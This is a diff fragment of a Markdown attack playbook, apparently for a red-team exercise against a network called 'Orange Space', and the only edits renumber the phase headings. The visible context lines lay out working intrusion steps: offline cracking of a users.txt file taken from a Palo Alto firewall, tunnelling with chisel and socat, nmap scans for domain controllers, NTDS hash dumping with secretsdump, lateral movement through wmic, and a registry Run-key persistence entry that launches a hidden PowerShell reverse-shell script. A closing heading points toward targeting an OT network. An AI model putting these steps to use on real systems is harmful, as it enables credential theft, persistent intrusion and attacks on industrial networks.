@@ -272,7 +272,7 @@ Now that we have a way to return to the system, let’s gather critical files co
    `exit`
 
 
-# Phase 4: Privilege Escalation
+## Phase 4: Privilege Escalation
 In this section, we will leverage the exfiltrated users.txt file that was pulled from the Palo Alto system. We will perform offline password cracking to gain legitimate credentials for the device.
 
 1. First, verify that you’re in the correct directory where users.txt is located. You can search for the file and navigate to it with the following commands: `find / -name "users.txt"`
@@ -294,7 +294,7 @@ In this section, we will leverage the exfiltrated users.txt file that was pulled
 
 
 
-# Phase 4: Internal Reconnaissance & Enumeration
+## Phase 5: Internal Reconnaissance & Enumeration
 Once inside the firewall OS:
 ### Identify internal interfaces and routes
 
@@ -314,7 +314,7 @@ cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
 - sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
 network.
 
-## Phase 5: Target Discovery Inside Orange Space
+## Phase 6: Target Discovery Inside Orange Space
 Assuming pivot success to internal hosts:
 #### Scan internal subnets for DC or LDAP
 ```bash
@@ -323,7 +323,7 @@ nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
 
 - Look for the Domain Controller (likely in orange-servers or orange-users).
 
-## Phase 6: Credential Access (via LDAP, SAM/NTDS)
+## Phase 7: Credential Access (via LDAP, SAM/NTDS)
 - Once a DC is identified (e.g., 172.20.2.X), you can:
 	- 88, 389
 - Enumerate via LDAP (LOLBAS):
@@ -351,7 +351,7 @@ Then parse locally:
 ```bash
 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
 ```
-## Phase 7: Lateral Movement and Persistence
+## Phase 8: Lateral Movement and Persistence
 Use Admin Shares:
 ```bash
 wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
@@ -376,4 +376,4 @@ reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t
 REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\rev.ps1"
 ```
 
-## Phase 8: OT Network Target Prep (Later Stage)
+## Phase 9: OT Network Target Prep (Later Stage)
